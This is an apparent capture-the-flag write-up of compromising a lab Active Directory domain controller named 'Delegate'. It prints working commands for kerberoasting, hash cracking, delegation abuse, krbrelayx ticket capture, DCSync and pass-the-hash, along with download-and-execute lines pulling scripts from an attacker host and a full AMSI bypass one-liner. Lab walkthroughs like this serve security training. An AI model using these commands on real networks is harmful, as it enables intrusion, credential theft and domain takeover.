---
title: 'VL Delegate - Medium'
date: 2024-05-10 15:00:00 +0000
categories: [VL Machines]
tags: [Medium, Windows, VL]
---
**Delegate** is a medium VL machine where you need to **enumerate SMB shares** to gain credentials. From there, it is possible to perform a **targeted kerberoast** attack against a user by **abusing GenericWrite object permissions**. The privilege escalation to Domain Admins is achievable by exploiting the **SeEnableDelegationPrivilege** of the compromised user, creating a machine account with **unconstrained delegation** to subsequently do a **DC Sync attack** and steal the domain administrator hash.

<img src="/assets/img/delegate/Untitled.png" alt="Untitled.png" style="width:400px;">

# Reconnaissance

Started with an Nmap NSE scan against top 1000 TCP ports.

```bash
nmap -sVC 10.10.74.48 -Pn -n
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 16:15 WEST
Nmap scan report for 10.10.74.48
Host is up (0.070s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-10 15:18:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-10T15:19:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2024-05-09T15:17:36
|_Not valid after:  2024-11-08T15:17:36
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-10T15:18:21+00:00
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-10T15:18:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.82 seconds
```

Appended the newly discovered domain and hostname to /etc/hosts.

```bash
echo -e "10.10.74.48\tdelegate.vl DC1.delegate.vl" | sudo tee -a /etc/hosts
10.10.74.48     delegate.vl DC1.delegate.vl
```

SMB anonymous login is enabled.

```bash
netexec smb 10.10.74.48 -u "anonymous" -p "" --shares
SMB         10.10.74.48     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.48     445    DC1              [+] delegate.vl\anonymous: 
SMB         10.10.74.48     445    DC1              [*] Enumerated shares
SMB         10.10.74.48     445    DC1              Share           Permissions     Remark
SMB         10.10.74.48     445    DC1              -----           -----------     ------
SMB         10.10.74.48     445    DC1              ADMIN$                          Remote Admin
SMB         10.10.74.48     445    DC1              C$                              Default share
SMB         10.10.74.48     445    DC1              IPC$            READ            Remote IPC
SMB         10.10.74.48     445    DC1              NETLOGON        READ            Logon server share 
SMB         10.10.74.48     445    DC1              SYSVOL          READ            Logon server share
```

# Exploitation

Inspecting the NETLOGON’s share shows a batch file.

```bash
smbclient -U delegate.vl\\anonymous -N //10.10.74.48/NETLOGON -c ls
  .                                   D        0  Sat Aug 26 13:45:24 2023
  ..                                  D        0  Sat Aug 26 10:45:45 2023
  users.bat                           A      159  Sat Aug 26 13:54:29 2023

                5242879 blocks of size 4096. 1932050 blocks available
```

Downloaded the file to our VM and discovered a user and a clear-text password.

```
smbclient -U delegate.vl\\anonymous -N //10.10.74.48/NETLOGON -c "get users.bat"
getting file \users.bat of size 159 as users.bat (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

cat users.bat 
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator <REDACTED>
```

NetExec confirms that the credentials are valid.

```bash
netexec smb 10.10.74.48 -u A.Briggs -p '<REDACTED>' --shares
SMB         10.10.74.48     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.48     445    DC1              [+] delegate.vl\A.Briggs:<REDACTED> 
SMB         10.10.74.48     445    DC1              [*] Enumerated shares
SMB         10.10.74.48     445    DC1              Share           Permissions     Remark
SMB         10.10.74.48     445    DC1              -----           -----------     ------
SMB         10.10.74.48     445    DC1              ADMIN$                          Remote Admin
SMB         10.10.74.48     445    DC1              C$                              Default share
SMB         10.10.74.48     445    DC1              IPC$            READ            Remote IPC
SMB         10.10.74.48     445    DC1              NETLOGON        READ            Logon server share 
SMB         10.10.74.48     445    DC1              SYSVOL          READ            Logon server share
```

<img src="/assets/img/delegate/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

However, we don’t have PS Remote access to the machine.

```bash
netexec winrm 10.10.74.48 -u A.Briggs -p '<REDACTED>'     
WINRM       10.10.74.48     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
WINRM       10.10.74.48     5985   DC1              [-] delegate.vl\A.Briggs:<REDACTED>
```

# Lateral Movement

Executed [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) with the credentials gathered.

```bash
bloodhound-python -u A.Briggs -p '<REDACTED>' -ns 10.10.74.48 -d delegate.vl -c all
```

Marking ‘A.Briggs’ as owned shows a clear path to achieve a foothold.

<img src="/assets/img/delegate/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

BH suggests using [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to abuse the GenericWrite permission over the user object.

<img src="/assets/img/delegate/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

And it worked great! A new tool to the arsenal.

```bash
python3 ~/Desktop/tools/targetedKerberoast/targetedKerberoast.py -u A.Briggs -p '<REDACTED>' -d delegate.vl --request-user "N.Thompson"
[*] Starting kerberoast attacks
[*] Attacking user (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$e7b31...
```

It was a weak password, so we could crack it.

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$e...:<REDACTED>
```

NetExec confirms that the credentials are valid. According to BH, we should have WinRM access.

```bash
netexec smb 10.10.74.48 -u N.Thompson -p '<REDACTED>' --shares
SMB         10.10.74.48     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.48     445    DC1              [+] delegate.vl\N.Thompson:<REDACTED> 
SMB         10.10.74.48     445    DC1              [*] Enumerated shares
SMB         10.10.74.48     445    DC1              Share           Permissions     Remark
SMB         10.10.74.48     445    DC1              -----           -----------     ------
SMB         10.10.74.48     445    DC1              ADMIN$                          Remote Admin
SMB         10.10.74.48     445    DC1              C$                              Default share
SMB         10.10.74.48     445    DC1              IPC$            READ            Remote IPC
SMB         10.10.74.48     445    DC1              NETLOGON        READ            Logon server share 
SMB         10.10.74.48     445    DC1              SYSVOL          READ            Logon server share
```

We do.

```bash
netexec winrm 10.10.74.48 -u N.Thompson -p '<REDACTED>'    
WINRM       10.10.74.48     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
WINRM       10.10.74.48     5985   DC1              [+] delegate.vl\N.Thompson:<REDACTED> (Pwn3d!)
```

Connected over WinRM and read the user flag.

```
evil-winrm -u N.Thompson -p <REDACTED> -i 10.10.74.48

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
delegate\n.thompson

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> hostname
DC1

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> type c:\users\n.thompson\desktop\user.txt
VL{<REDACTED>}
```

# PrivEsc

Listing the current user privileges shows the ‘SeEnableDelegationPrivilege’.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

Machine Account Quota is set to default (10). This means that we can add a machine and grant it with **unconstrained delegation** abusing the **SeEnableDelegationPrivilege**.

```bash
netexec ldap 10.10.74.48 -u N.Thompson -p <REDACTED> -M MAQ
SMB         10.10.74.48     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
LDAP        10.10.74.48     389    DC1              [+] delegate.vl\N.Thompson:<REDACTED> 
MAQ         10.10.74.48     389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.10.74.48     389    DC1              MachineAccountQuota: 10
```

Imported [PowerMad](https://github.com/Kevin-Robertson/Powermad) right into memory.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> (new-object system.net.webclient).downloadstring("http://10.8.1.206/Powermad.ps1")|iex
```

Created a new machine account called DUSK$, granted it with TRUSTED_FOR_DELEGATION and created a new WWW/dusk.delegate.vl SPN.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> new-machineaccount -machineaccount dusk$ -password $(convertto-securestring 'Dusk3d123!' -asplaintext -force)
[+] Machine account dusk$ added

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> set-machineaccountattribute -machineaccount dusk$ -attribute useraccountcontrol -value 528384
[+] Machine account dusk attribute useraccountcontrol updated

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> set-machineaccountattribute -machineaccount dusk$ -attribute serviceprincipalname -value WWW/dusk.delegate.vl -append
[+] Machine account dusk attribute serviceprincipalname appended
```

Uploading [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to verify the changes got blocked by AMSI.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> (new-object system.net.webclient).downloadstring("http://10.8.1.206/powerview.ps1")|iex
This script contains malicious content and has been blocked by your antivirus software.
```

Let’s try to bypass AMSI with the following script.

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Nice! We bypassed AMSI and confirmed that the DUSK$ machine is granted with unconstrained delegation.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> (new-object system.net.webclient).downloadstring("http://10.8.1.206/amsi.txt")|iex
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> (new-object system.net.webclient).downloadstring("http://10.8.1.206/powerview.ps1")|iex

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> get-domaincomputer -unconstrained | select distinguishedname, useraccountcontrol

distinguishedname                                                             useraccountcontrol
-----------------                                                             ------------------
CN=DC1,OU=Domain Controllers,DC=delegate,DC=vl      SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
CN=dusk,CN=Computers,DC=delegate,DC=vl         WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
```

Converted the machine password to an NTLM hash using [this website](https://www.browserling.com/tools/ntlm-hash).

<img src="/assets/img/delegate/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

We can’t connect to the DUSK$ machine’s host and use [Rubeus](https://github.com/GhostPack/Rubeus) in monitor mode, but it is possible to do all this from our VM with [krbrelayx](https://github.com/dirkjanm/krbrelayx).

Created a DNS record and started krbrelayx in monitor mode.

```bash
python3 ~/Desktop/tools/krbrelayx/dnstool.py -u delegate.vl\\N.Thompson -p <REDACTED> -a add -t A -d 10.8.1.206 -r dusk.delegate.vl 10.10.88.142
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

python3 ~/Desktop/tools/krbrelayx/krbrelayx.py -hashes :02CBC903FE8665E4FE2623E0DAA93CBD
[*] Servers started, waiting for connections
```

Forced the DC1$ machine account to authenticate to us.

```bash
python3 ~/Desktop/tools/krbrelayx/printerbug.py 'delegate.vl/dusk$'@10.10.88.142 dusk.delegate.vl -hashes :02CBC903FE8665E4FE2623E0DAA93CBD
```

We successfully captured a DC1$ forwardable TGT!

```bash
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

It is not possible to remotely connect as a machine account, but we can perform a **DCSync attack** to dump the domain administrator NTLM hash.

```bash
KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' impacket-secretsdump DC1.delegate.vl -k -no-pass -just-dc-user administrator -just-dc-ntlm
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<REDACTED>:::
[*] Cleaning up...
```

With the administrator hash in our hands, let’s connect to the DC and read the root flag. GGs!

```
impacket-wmiexec delegate.vl/administrator@DC1.delegate.vl -hashes :<REDACTED>

C:\>whoami
delegate\administrator

C:\>hostname
DC1

C:\>type c:\users\administrator\desktop\root.txt
VL{<REDACTED>}
```